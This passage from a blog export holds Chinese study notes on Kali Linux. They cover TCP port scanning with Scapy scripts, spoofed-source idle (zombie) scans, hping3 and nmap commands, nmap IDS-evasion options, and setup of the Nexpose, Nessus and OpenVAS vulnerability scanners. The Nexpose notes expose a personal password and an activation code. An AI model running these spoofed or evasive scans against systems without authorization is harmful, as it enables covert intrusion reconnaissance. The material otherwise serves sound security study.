        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(十八)：端口扫描--TCP</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AB)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--TCP/</url>
    <content><![CDATA[<hr>
<h4 id="1-端口扫描（TCP）"><a href="#1-端口扫描（TCP）" class="headerlink" title="1. 端口扫描（TCP）"></a>1. 端口扫描（TCP）</h4><ul>
<li><p>TCP端口扫描（SYN–SYN/ACK–ACK）</p>
<ul>
<li>基于连接的协议</li>
<li>三次握手（ACK包连接）</li>
<li>隐蔽扫描（隐藏与目标进程的会话）–SYN（开放 →SYN/ACK，不开放 → RST）</li>
</ul>
<ol>
<li>不建立完整连接（SYN（开放 →SYN/ACK，不开放 → RST））</li>
<li>应用日志不记录扫描行为–隐蔽（但审计网络层，还是可以发现）</li>
</ol>
<ul>
<li>僵尸扫描（几乎不和目标进程尝试会话）</li>
</ul>
<ol>
<li>极度隐蔽</li>
<li>实施条件苛刻</li>
<li>可伪造源地址（▲扫描者与目标主机必须可以实现地址伪造）</li>
<li>选择僵尸机（▲必须要有，网络中闲置的机子，不同于僵尸网络的机子）<ul>
<li>闲置系统</li>
<li>系统使用递增的IPID：（1）不能为0 （2）不能为随机</li>
</ul>
</li>
</ol>
<ul>
<li>全连接扫描（三次握手连接）</li>
<li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>IPID:IP报头里面的Identification字段
1.僵尸扫描过程（端口开放）：
（1）Scanner【SYN/ACK】 -- Zombie【RST IPID=X】
（2）Scanner【SYN IPSRC=zombie】 -- target【SYN/ACK】 -- Zombie【RST IPID=x+1,(僵尸机需要足够空闲)】
（3）Scanner【SYN/ACK】 -- Zombie【RST IPID=x+2】
2.僵尸扫描进程（端口未开放）：
（1）Scanner【SYN/ACK】 -- Zombie【RST IPID=X】
（2）Scanner【SYN IPSRC=zombie】 -- target【RST】 -- Zombie
（3）Scanner【SYN/ACK】 -- Zombie【RST IPID=x+1】</code></pre></blockquote>
<h4 id="2-隐蔽端口扫描"><a href="#2-隐蔽端口扫描" class="headerlink" title="2. 隐蔽端口扫描"></a>2. 隐蔽端口扫描</h4><ul>
<li>syn–syn/ack–rst（本机操作系统内核产生的）</li>
<li>Scapy<ul>
<li>sr1(IP(dst=”IP地址”)/TCP(dport=80,flags=”S”),timeout=1,verbose=0)</li>
<li><strong><code>🔺命令：./syn_scan.py 目标IP地址 起始端口 结束端口</code></strong></li>
</ul>
</li>
</ul>
<pre><code>#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *
import time
import sys

if len(sys.argv)!=4:
    print &quot;Usage - ./syn_scan.py [Target IP] [First IP] [Last IP] &quot;
    print &quot;Example - ./syn_scan.py 192.168.100.1 1 200&quot;
    print &quot;Example will perform a TCP SYN scan of the 192.168.100.0/24 range&quot;
    sys.exit()

ip=sys.argv[1]
start=int(sys.argv[2])
end=int(sys.argv[3])

for port in range(start,end):
    a=sr1(IP(dst=ip)/TCP(dport=port),timeout=1,verbose=0)
    if a==None:
      pass
    else:
      if int(a[TCP].flags)==18:
        print port
      else:
        pass</code></pre><blockquote>
<pre><code>正常情况下：
端口开放：syn--syn/ack
端口未开放：syn--rst/ack</code></pre></blockquote>
<h4 id="3-隐蔽端口扫描"><a href="#3-隐蔽端口扫描" class="headerlink" title="3. 隐蔽端口扫描"></a>3. 隐蔽端口扫描</h4><ul>
<li><strong><code>🔺命令：nmap -sS IP地址 -p 80,21,25,110,443</code></strong></li>
<li><strong><code>🔺命令：nmap -sS IP地址 -p 1-65535 --open</code></strong></li>
<li><strong><code>🔺命令：nmap -sS IP地址 --open</code></strong></li>
<li><strong><code>🔺命令：nmap -sS -iL iplist.txt -p 80,21,22,23</code></strong></li>
</ul>
<h4 id="4-隐蔽端口扫描"><a href="#4-隐蔽端口扫描" class="headerlink" title="4. 隐蔽端口扫描"></a>4. 隐蔽端口扫描</h4><ul>
<li>hping3（发包习惯是顺序端口）</li>
<li><strong><code>🔺命令：hping3 IP地址 --scan 80 -S</code></strong></li>
<li><strong><code>🔺命令：hping3 IP地址 --scan 80,21,25,443 -S</code></strong>（syn包）</li>
<li><strong><code>🔺命令：hping3 IP地址 --scan 0-65535 -S</code></strong></li>
<li><strong><code>🔺命令：hping3 -c 10 -S --spoof（伪造源地址） IP地址 -p ++1（端口递增） IP地址</code></strong></li>
</ul>
<h4 id="5-全连接端口扫描"><a href="#5-全连接端口扫描" class="headerlink" title="5. 全连接端口扫描"></a>5. 全连接端口扫描</h4><ul>
<li>Scapy（容易触发目标主机的报警系统）<ul>
<li>syn扫描不需要raw packets</li>
<li>内核认为syn/ack是非法包，直接发rst终断连接</li>
<li>全连接扫描对scapy比较困难</li>
</ul>
</li>
<li>sr1(IP(dst=”IP地址”)/TCP(dport=22,flags=”S”))</li>
<li><strong><code>🔺命令：./tcp_scan1.py（代码内指定IP地址）</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

response=sr1(IP(dst=&quot;IP地址&quot;)/TCP(dport=80,flags=&quot;S&quot;))
reply=sr1(IP(dst=&quot;IP地址&quot;)/TCP(dport=80,flags=&quot;A&quot;,ack=(response[TCP].seq+1)))</code></pre><ul>
<li><strong><code>🔺命令：./tcp_scan2.py（代码内指定IP地址）</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

SYN=IP(dst=&quot;IP地址&quot;)/TCP(dport=25,flags=&quot;S&quot;)

print &quot;--SENT--&quot;
SYN.display()

print &quot;\n\n--RECEIVED--&quot;
response=sr1(SYN,timeout=1,verbose=0)
response.display()

if int(response[TCP].flags)==18:
    print &quot;\n\n--SENT--&quot;
    A=IP(dst=&quot;IP地址&quot;)/TCP(dport=25,flags=&quot;A&quot;,ack=(response[TCP].seq+1))
    A.display()
    print &quot;\n\n--RECEIVED--&quot;
    response2=sr1(A,timeout=1,verbose=0)
    response2.display()
else:
    print &quot;SYN-ACK not returned&quot;</code></pre><ul>
<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 目标IP地址 -j DROP</code></strong></li>
</ul>
<blockquote>
<pre><code>iptables是工作在底层的防火墙，在内核之前过滤数据
iptables -L查看当前防火墙规则</code></pre></blockquote>
<h4 id="6-全连接端口扫描"><a href="#6-全连接端口扫描" class="headerlink" title="6. 全连接端口扫描"></a>6. 全连接端口扫描</h4><ul>
<li><strong><code>🔺命令：nmap IP地址 -sT -p 80</code></strong></li>
<li><strong><code>🔺命令：nmap IP地址 -sT -p 80,21,25</code></strong></li>
<li><strong><code>🔺命令：nmap IP地址 -sT -p 1-65535</code></strong></li>
<li><strong><code>🔺命令：nmap -sT -iL iplist.txt -p 80</code></strong></li>
<li>默认1000个常用端口</li>
</ul>
<h4 id="7-全连接端口扫描"><a href="#7-全连接端口扫描" class="headerlink" title="7. 全连接端口扫描"></a>7. 全连接端口扫描</h4><ul>
<li>dmitry<ul>
<li>功能简单，但使用简便</li>
<li>默认150个常用端口</li>
</ul>
</li>
<li><strong><code>🔺命令：dmitry -p IP地址</code></strong></li>
<li><strong><code>🔺命令：dmitry -p IP地址 -o output</code></strong></li>
</ul>
<h4 id="8-全连接端口扫描"><a href="#8-全连接端口扫描" class="headerlink" title="8. 全连接端口扫描"></a>8. 全连接端口扫描</h4><ul>
<li><strong><code>🔺命令：nc -nv -w（连接的超时时间）1 -z IP地址 1-65535</code></strong>（倒序发送）</li>
<li><strong><code>🔺命令：for x in $(seq 20 30);do nc -nv -w 1 -z IP地址 $x;done | grep open</code></strong></li>
<li><strong><code>🔺命令：for x in $(seq 1 254);do nc -nv -w 1 -z 1.1.1.$x 80;done</code></strong></li>
</ul>
<h4 id="9-僵尸扫描"><a href="#9-僵尸扫描" class="headerlink" title="9. 僵尸扫描"></a>9. 僵尸扫描</h4><blockquote>
<pre><code>早期的Window系统，包括XP,2003,98系统的IPID是递增的</code></pre></blockquote>
<ul>
<li>Scapy–zomebie.py<ul>
<li>i=IP()</li>
<li>t=TCP()</li>
<li>rz=(i/t)</li>
<li>rt=(i/t)</li>
<li>rz[IP].dst=”zombie IP地址”</li>
<li>rz[TCP].dport=445</li>
<li>rz[TCP].flags=”SA”</li>
<li>rt[IP].src=”zombie IP地址”</li>
<li>rt[IP].dst=”target IP地址”</li>
<li>rt[TCP].dport=22</li>
<li>rt[TCP].flags=”S”</li>
<li>az1=sr1(rz) / at=sr1(rt,timeout=1) / az2=sr1(rz)</li>
<li>az1.display() / az2.display()</li>
</ul>
</li>
<li><strong><code>🔺命令：./zombie.py</code></strong></li>
</ul>
<pre><code>#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

def ipid(zombie):
    reply1=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose=0)
    send(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),verbose=0)
    reply2=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose=0)
    if reply2[IP].id==(reply1[IP].id+2):
      print &quot;IPID sequence is incremental and target appears to be idle.ZOMBIE LOCATED&quot;
      response=raw_input(&quot;DO you want to use this zombie to perfore scan?(Y or N):&quot;)
      if response==&quot;Y&quot;:
        target=raw_input(&quot;Enter the IP Address of the target system:&quot;)
        zombiescant(target,zombie)
    else:
      print &quot;Either the IPID sequence is not incremental or the target is not idle.NOT A GOOD ZOMBIE&quot;

def zombiescan(target,zombie):
    print &quot;\nScanning target &quot;+target+&quot; with zombie &quot;+zombie
    print &quot;\n-----------Open Ports On Target-------------\n &quot;
    for port in range(1,100):
      try:
        start_val=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;,dport=port),timeout=2,verbose=0)
        send(IP(src=zombie,dst=target)/TCP(flags=&quot;S&quot;,dport=port),verbose=0)
        end_val=sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;,dport=port),timeout=2,verbose=0)
        if end_val[IP].id==(start_val[IP].id+2):
          print port
      except:
        pass

print &quot;----------------Zombie Scan Suite-----------\n&quot;
print &quot;1 - Identify Zombie Host\n&quot;
print &quot;2 - Perform Zombie Scan\n&quot;
ans=raw_input(&quot;Select an Option (1 or 2):&quot;)
if ans==&quot;1&quot;:
    zombie=raw_input(&quot;Enter IP Address to test IPID sequence&quot;)
    ipid(zombie)
else:
    if ans==&quot;2&quot;:
      zombie=raw_input(&quot;Enter IP Address for zombie sysytem:&quot;)
      target=raw_input(&quot;Enter IP Address for scan target:&quot;)
      zombiescan(target,zombie)</code></pre><blockquote>
<pre><code>sr1 发包只收一个数据包
send 发包不收数据包</code></pre></blockquote>
<h4 id="10-僵尸扫描"><a href="#10-僵尸扫描" class="headerlink" title="10. 僵尸扫描"></a>10. 僵尸扫描</h4><ul>
<li>发现僵尸机<ul>
<li><strong><code>🔺命令：nmap -p445 IP地址 --script=ipidseq.nse</code></strong></li>
</ul>
</li>
<li>扫描目标<ul>
<li><strong><code>🔺命令：nmap target的IP地址 -sI（指定zombie） zomboe的IP地址 -Pn -p 0-100</code></strong></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十一)：NMAP</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%80)%EF%BC%9ANAMP/</url>
    <content><![CDATA[<hr>
<h4 id="1-NMAP"><a href="#1-NMAP" class="headerlink" title="1. NMAP"></a>1. NMAP</h4><ul>
<li>所有参数</li>
<li>目标发现<ul>
<li>-iL <inputfilename>（列表文件作为输入）</li>
<li>-iR <num hosts>（随机选择目标进行扫描）</li>
<li>–exclude &lt;host1[,host2]&gt;（扫描网址段不包含）</li>
<li>–excludefile <exclude_file>（排除文件）</li>
</ul>
</li>
<li>主机发现<ul>
<li>-sL（不做扫描，列出地址段）</li>
<li>-sn（ping扫描，不做端口扫描）</li>
<li>-Pn（彻底扫描地址段，不回包也进行扫描）</li>
<li>-PS/PA/PU/PY （TCP SYN/ACK，UDP or SCTP发现）</li>
<li>-P0/PS/PE/PP/PM （Ping层的发现/SCTP发现/ICMP echo/时间戳/子网掩码发现）</li>
<li>-n/-R （不做DNS解析/自动做反向解析）</li>
<li>–dns-servers &lt;serv1[,serv2]&gt;（指定DNS解析服务器）</li>
<li>–system-dns（操作系统默认的DNS解析服务器）</li>
<li>–traceroute（扫描进行路由追踪）</li>
</ul>
</li>
<li>端口发现<ul>
<li>sS/sT/sA/sW/sM （TCP SYN/Connect()/ACK/Window/Maimon scans）</li>
<li>sU （UDP扫描）</li>
<li>sN/sF/sX （TCP Null，Fin and xmas scans）</li>
<li>–scanflags <flags> （选择要扫描的flags）</li>
<li>-sI &lt;zombie host[:probeport]&gt;（僵尸扫描）</li>
<li>-sY/sZ （SCTP协议参数）</li>
<li>-s0（IP扫描）</li>
<li>-b <FTP relay host>（FTP中继扫描）</li>
</ul>
</li>
<li>指定扫描端口<ul>
<li>-p <port number> U → UDP T → TCP</li>
<li>–exclude-ports <port ranges> （排除端口）</li>
<li>-F （快速模式，比较少数量端口）</li>
<li>-r （连续扫描端口，少于1000个端口）</li>
<li>–top-ports <number> （扫描1000端口的前面端口）</li>
<li>–port-ratio <ratio> （扫描更常见的端口）</li>
</ul>
</li>
<li>服务/版本识别<ul>
<li>-sV （服务特征库匹配）</li>
<li>-sV –version-intensity <level> （扫描的深度、强度）</li>
<li>-sV –version-light （intensity=2）</li>
<li>-sV –version-all （intensity=9）</li>
<li>-sV –version-trace（扫描过程进行跟踪）</li>
</ul>
</li>
<li>脚本扫描<ul>
<li>-sC （脚本扫描，一般是–script=default）</li>
<li>–script=<Lua script> （使用Lua脚本）</li>
<li>–script-args=&lt;n1=v1[,n2=v2]&gt; （修改参数）</li>
<li>–script-update （脚本库更新）</li>
<li>–script-trace （进行路由追踪）</li>
<li>–script-help=<Lua scripts> （脚本使用教程帮助）</li>
</ul>
</li>
<li>OS 扫描<ul>
<li>-O （检测OS）</li>
<li>–osscan-limit （OS检测限制）</li>
<li>–osscan-guess （OS猜测）</li>
</ul>
</li>
<li>时间和性能<ul>
<li>-‘s’,’m’,’h’,’ms’ （秒、分、时、毫秒）</li>
<li>–min-hostgroup/max-hostgroup <size> （并行扫描主机组的数量）</li>
<li>–min-parallelism/max-parallelism <numprobes> （并行探测数量）</li>
<li>–min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time> （rtt时间）</li>
<li>–max-retries <tries> （最大回包时间）</li>
<li>–host-timeout <time> （主机超时时间）</li>
<li>–scan-delay/–max-scan-delay <time> （主机延迟发包时间）</li>
<li>–min-rate <number> （最小发包速率）</li>
<li>–max-rate <number> （最大发包速率）</li>
</ul>
</li>
<li>防火墙/IDS躲避、欺骗<ul>
<li>-f –mtu <val> （设置传输单元）</li>
<li>-D &lt;decoy1,decoy2[,ME]&gt; （伪造源地址，增加噪声IP）</li>
<li>-S <IP Address> （欺骗源地址）</li>
<li>-e <iface> （指定使用的网卡）</li>
<li>-g/–source-port <portnum> （指定源端口进行发包）</li>
<li>–proxies &lt;url1,[url2]&gt; （指定代理服务器）</li>
<li>–data <hex string> （指定十六进制字符串，在包的后面增加）</li>
<li>–data-string <string> （增加ACSII码字符串）</li>
<li>–data-length <num> （数据的长度）</li>
<li>–ip-options <options> （修改IP的选项）</li>
<li>–ttl <val> （设置IP的TTL值）</li>
<li>–spoof-mac &lt;mac address/prefix/vendor name&gt; （欺骗MAC地址）</li>
<li>–badsum （发送错误的TCP/UDP/SCTP 校验和）</li>
</ul>
</li>
<li>MISC<ul>
<li>-6 （可以扫IPv6地址）</li>
<li>-A （OS，version，script，traceroute的组合命令）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十五)：NEXPOSE</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%BA%94)%EF%BC%9ANEXPOSE/</url>
    <content><![CDATA[<hr>
<h4 id="1-NEXPOSE"><a href="#1-NEXPOSE" class="headerlink" title="1. NEXPOSE"></a>1. NEXPOSE</h4><ul>
<li>Rapid7<ul>
<li>Nexpose</li>
<li>完整的漏洞管理实现</li>
</ul>
</li>
<li>环境准备<ul>
<li>建议VM 4G内存</li>
<li><a href="https://www.rapid7.com/products/nexpose/download/" target="_blank" rel="noopener">https://www.rapid7.com/products/nexpose/download/</a></li>
<li><a href="https://IP_ADDR:3780（nxadmin/nxpassword,后改为Rapid7@mazhentao）" target="_blank" rel="noopener">https://IP_ADDR:3780（nxadmin/nxpassword,后改为Rapid7@mazhentao）</a></li>
<li>操作系统账号密码：nexpose</li>
<li><a href="https://www.rapid7.com/try/nexpose/" target="_blank" rel="noopener">https://www.rapid7.com/try/nexpose/</a></li>
<li>QHWT-72GT-BHDS-FQLH（激活码进行注册，30天有效期）</li>
<li>service nexposeconsole.cc restart（重启命令，但初始化时间非常长）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>概念：用扫描器去发现漏洞，用渗透框架去验证漏洞
▲ 2019.12.8可以注册一个企业邮箱，可申请多个（腾讯。网易等）
▲ 2019.12.8需要修改密码，至少一个数字，一个大写字母，一个字符，长度大于14位，多次不成功会锁账号 Rapid7@mazhentao
▲ 2019.12.8只有注册后，才可下载到ova文件</code></pre></blockquote>
<h4 id="2-Administrator"><a href="#2-Administrator" class="headerlink" title="2. Administrator"></a>2. Administrator</h4><ul>
<li>Scan Templates<ul>
<li>Exhaustive → Copy</li>
<li>General → Name → Types of Checks（Assert Discovery、Vulnerability、WebSpldering、Policies）</li>
<li>Asset Discovery（主机发现）</li>
<li>Service Discovery（服务发现）</li>
<li>Discovery Performance（发现选项）</li>
<li>Vulnerability Checks（unsafe or safe，<strong>！Select Checks！</strong>）</li>
<li>File Searching（文件搜索）</li>
<li>Spam Relaying（垃圾邮件）</li>
<li>Database Servers（数据库）</li>
<li>Mail Server（邮件服务器）</li>
<li>CVS Serverr（版本管理服务器）</li>
<li>DHCP Server</li>
<li>Telnet Server</li>
<li>Web Spldering（网页爬网，有可能造成CC攻击）</li>
<li>Oracle Policy（Oracle 策略）</li>
<li>Lotus Domino Policy（Lotus Domino 策略）</li>
<li>Windows Group Policy（window 组策略）</li>
<li>CIFS/SMB Account Policy（CIFS/SMB 账号策略）</li>
<li>AS/400 Policy（AS/400 机型策略）</li>
<li>Unix Policy（Unix 策略）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>企业在美国上市需要过塞班思发案，也即404法案，Sarbans-Oxley compliance
支付行业要过PCI ASV Extemal Audit/PCI Internal Aduit</code></pre></blockquote>
<ul>
<li>Sites（在home）<ul>
<li>Create sites</li>
<li>INFO &amp; SECURITY</li>
<li>ASSETS</li>
<li>AUTHENTICATION（Web Application → HTML FORM/HTTP HEADERS（SEESIONID））</li>
<li>TEMPLATES</li>
<li>ENGINES（扫描引擎）</li>
<li>ALERTS（到点，可以用于发送mail）</li>
<li>SCHEDULE</li>
</ul>
</li>
</ul>
<h4 id="3-扫描结果分析"><a href="#3-扫描结果分析" class="headerlink" title="3. 扫描结果分析"></a>3. 扫描结果分析</h4><ul>
<li>False Positive：误报</li>
<li>False negative：漏报</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十四)：NESSUS</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%9B%9B)%EF%BC%9ANESSUS/</url>
    <content><![CDATA[<hr>
<h4 id="1-NESSUS"><a href="#1-NESSUS" class="headerlink" title="1. NESSUS"></a>1. NESSUS</h4><ul>
<li>家庭版<ul>
<li>免费</li>
</ul>
</li>
<li>专业版<ul>
<li>收费，无限的并发连接</li>
</ul>
</li>
<li>下载<ul>
<li><a href="https://www.tenable.com/downloads/nessus" target="_blank" rel="noopener">https://www.tenable.com/downloads/nessus</a></li>
</ul>
</li>
<li>安装<ul>
<li><strong><code>🔺命令：dpkg -i 文件dbg</code></strong></li>
<li>安装路径：/opt/nessus</li>
</ul>
</li>
<li>启动服务<ul>
<li><strong><code>🔺命令：/etc/init.d/nessusd start</code></strong></li>
<li><strong><code>🔺命令：/etc/init.d/nessusd status</code></strong>（查看状态）</li>
</ul>
</li>
<li>管理地址<ul>
<li><a href="https://127.0.0.1:8834" target="_blank" rel="noopener">https://127.0.0.1:8834</a></li>
</ul>
</li>
<li>注册激活码<ul>
<li><a href="https://www.tenable.com/products/nessus/nessus-essentials" target="_blank" rel="noopener">https://www.tenable.com/products/nessus/nessus-essentials</a></li>
</ul>
</li>
<li>管理账号<ul>
<li>更新插件</li>
</ul>
</li>
<li>基本配置（setting）<ul>
<li>升级</li>
<li>账号</li>
<li>SMTP</li>
<li>代理</li>
</ul>
</li>
<li>Policy Library<ul>
<li>Advanced Scan（高级扫描）</li>
<li>Basic Shellshock Detection（检测破壳漏洞，系统的环境变量）</li>
<li>Basic Network Scan（基本网络扫描，for any host）</li>
<li>Credentialed Patch Audit（身份验证补丁）</li>
<li>GHOST（glibc）Detection（底层C语言模块漏洞）</li>
<li>Host Discovery（主机发现）</li>
<li>Web Applicattion Test（针对Web的漏洞，XSS,CSRF,SQL注入等）</li>
<li>Windows Mainware Scan（扫描恶意软件，计算恶意程序的哈希值，生成列表，来匹配）</li>
</ul>
</li>
</ul>
<h4 id="2-NESSUS扫描（window）"><a href="#2-NESSUS扫描（window）" class="headerlink" title="2. NESSUS扫描（window）"></a>2. NESSUS扫描（window）</h4><ul>
<li>Advanced Scan → Setting<ul>
<li>Basic → General（Name → window_vuln_scan_policy）</li>
<li>Basic → Permissions</li>
<li>Discovery → Host Discovery（Use fast network discovery，Add File（添加MAC地址））</li>
<li>Discovery → Prot Scanning（Ports → defult，TCP → SYN）</li>
<li>Discovery → Service Discovery（All Ports，Enable all SSL ciphers，Enable CRL checking）</li>
<li>Assessment → Web Application（open）</li>
<li>Advanced（not safe）</li>
</ul>
</li>
<li>Advanced Scan → Credentials（证书，证明提高）</li>
<li>Advanced Scan → Compliance（合规性）</li>
<li>Advanced Scan → Plugins（类似于openvas的family，插件）</li>
<li>New Scan → window_vuln_scan_policy  ▲ 2019.12.8 SMTP 25端口无法连接socket<ul>
<li>setting → send Email（SMTP Server）</li>
<li>Host：<a href="mailto:smtp@163.com" target="_blank" rel="noopener">smtp@163.com</a></li>
<li>Port：25</li>
<li>From：<a href="mailto:nessus@163.com" target="_blank" rel="noopener">nessus@163.com</a></li>
<li>Encryption：Use TLS if available</li>
<li>Hostname：localhost：8834</li>
<li>Auth Method：PLAIN</li>
<li>Username/Password   </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>windows增加用户密码：net user 用户 -
可添加一个针对Linux系统的Advabced Scan（linux_vuln_scan_policy）
可通过设置User Profile → API Keys来设置Access Key和Secret Key</code></pre></blockquote>
<h4 id="3-NESSUS"><a href="#3-NESSUS" class="headerlink" title="3. NESSUS"></a>3. NESSUS</h4><ul>
<li>策略</li>
<li>扫描</li>
<li>扫描本机</li>
<li>扫描windows</li>
<li>扫描Linux</li>
<li>扫描网络设备</li>
<li>扫描web server</li>
<li>报告</li>
<li>调度</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十三)：OPENVAS</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%89)%EF%BC%9AOPENVAS/</url>
    <content><![CDATA[<hr>
<h4 id="1-OPENVAS"><a href="#1-OPENVAS" class="headerlink" title="1. OPENVAS"></a>1. OPENVAS</h4><ul>
<li>Openvas<ul>
<li>Nessus项目分支</li>
<li>管理目标系统的漏洞</li>
<li>免费开源</li>
<li>Kali默认安装，但未配置和启动</li>
</ul>
</li>
</ul>
<h4 id="2-OPENVAS"><a href="#2-OPENVAS" class="headerlink" title="2. OPENVAS"></a>2. OPENVAS</h4><ul>
<li>安装</li>
<li>创建证书</li>
<li>同步弱点数据库NVT</li>
<li>创建客户端证书</li>
<li>重建数据库</li>
<li>备份数据库</li>
<li>启动服务装入插件</li>
<li>创建管理员账户</li>
<li>创建普通用户账号</li>
<li>配置服务侦听端口</li>
<li>安装验证</li>
</ul>
<blockquote>
<pre><code>Kali Linux配置OPENVAS，openvas-setup，现在一条命令即可
OPENVAS每天会发布feed，里面包含由一个或多个NVT</code></pre></blockquote>
<h4 id="3-OPENVAS"><a href="#3-OPENVAS" class="headerlink" title="3. OPENVAS"></a>3. OPENVAS</h4><ul>
<li>OpenVAS Manager（负责把其他的组件连接）<ul>
<li>控制Scanner和其他Manager的中心组件</li>
<li>控制中心数据库，保存用户配置及扫描结果</li>
<li>客户端使用基于XML的无状态OMP协议与其通信</li>
<li>集中排序筛选，使客户端获得一致展现</li>
</ul>
</li>
<li>OpenVAS Scanner（扫描器，可以多个scanner，多级部署）<ul>
<li>具体执行Network Vulnerability Tests（NVTs）</li>
<li>NVTs 每天通过更新Feed更新</li>
<li>受Manager控制</li>
</ul>
</li>
<li>OSP Scanner（scanner扫描器组）<ul>
<li>可以统一管理多个Scanner</li>
<li>将一组Scanner作为一个对象交给manager管理</li>
</ul>
</li>
<li>Greenbone Security Assistant（相当于一个服务器端，访问OpenVASManage）<ul>
<li>提高Web Service</li>
</ul>
</li>
<li>OMP Clients（支持通过API的方式去调用OpenVAS Manager）</li>
<li>Web Browser（通过GreenBone去访问OpenVAS Manager）</li>
<li>Feed（NVTS，SCAP CERT,User Data） </li>
<li>Target System</li>
<li>OpenVAS CLI<ul>
<li>omp命令行工具，可实现批处理控制manager</li>
</ul>
</li>
<li>更新很快<ul>
<li>所有找得到的资料几乎都已不同程度的过时了</li>
</ul>
</li>
</ul>
<h4 id="4-OPENVAS"><a href="#4-OPENVAS" class="headerlink" title="4. OPENVAS"></a>4. OPENVAS</h4><ul>
<li>初始化安装<ul>
<li><strong><code>🔺命令：openvas-setup</code></strong></li>
</ul>
</li>
<li>检查安装结果<ul>
<li><strong><code>🔺命令：openvas-check-setup</code></strong>（出问题会出现FIX错误项）</li>
</ul>
</li>
<li>查看当前账号<ul>
<li><strong><code>🔺命令：openvasmd --list-users</code></strong> ▲2019.12.7 无此参数</li>
</ul>
</li>
<li>修改账户密码<ul>
<li><strong><code>🔺命令：openvas --user=admin --new-password=Password</code></strong></li>
</ul>
</li>
<li>升级<ul>
<li><strong><code>🔺命令：openvas-feed-update</code></strong></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>openvasmd -h 可修改账户密码，可增加账户
9390端口：openvas manager
9391端口：默认第一scanner
9392端口：web登陆（https）
openvas-check-setup | grep Fix 可查看报错的组件
证书报错的原因：（1）名称与URL地址不一致（2）证书为自签名证书</code></pre></blockquote>
<h4 id="5-OPENVAS"><a href="#5-OPENVAS" class="headerlink" title="5. OPENVAS"></a>5. OPENVAS</h4><ul>
<li><strong><code>🔺命令：vi /usr/bin/openvas-start</code></strong>（调整启动服务顺序，对于kali2.0版本以下）<ul>
<li>Starting OpenVas Services</li>
<li>3\Starting OpenVas Manager.openvasmd</li>
<li>2\Starting OpenVas Scanner.openvassd</li>
<li>1\Starting Greenbone Security Assistant:gsad</li>
</ul>
</li>
<li>openvas-start</li>
</ul>
<h4 id="6-OPENVAS"><a href="#6-OPENVAS" class="headerlink" title="6. OPENVAS"></a>6. OPENVAS</h4><ul>
<li>Configration<ul>
<li>scan configs → windows_server_scan_configration</li>
<li>target → windows_xp（Alive Test → Consider Alive，Port List）</li>
<li>Port List → windows_xp_ports （or OpenVAS Default）</li>
<li>Schedules → weekly_scan（Period，Duration）</li>
</ul>
</li>
<li>Scan Management<ul>
<li>Tasks → weekly_windows_scan_task（Scan Target，Schedule，Add results to Asset Management，OpenVAS Scanner，Scan config，Slave，Network Sourece Interface，Order for target hosts，Maximum concurrently executed NVTs per host，Maximum concurrently scanner host）</li>
</ul>
</li>
<li>Configration<ul>
<li>scan configs → linux_unix_scan_configration</li>
</ul>
</li>
<li>start a short scan（full and fast，需要一个IP） ▲2019.12.7新版在Task Wizard中</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(二十二)：弱点扫描</title>
    <url>/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-发现弱点"><a href="#1-发现弱点" class="headerlink" title="1. 发现弱点"></a>1. 发现弱点</h4><ul>
<li>发现漏洞<ul>
<li>基于端口服务扫描结果版本信息（速度慢）</li>
<li>搜索已公开的漏洞数据库（数量大）</li>
<li>使用弱点扫描器实现漏洞管理</li>
</ul>
</li>
</ul>
<blockquote>
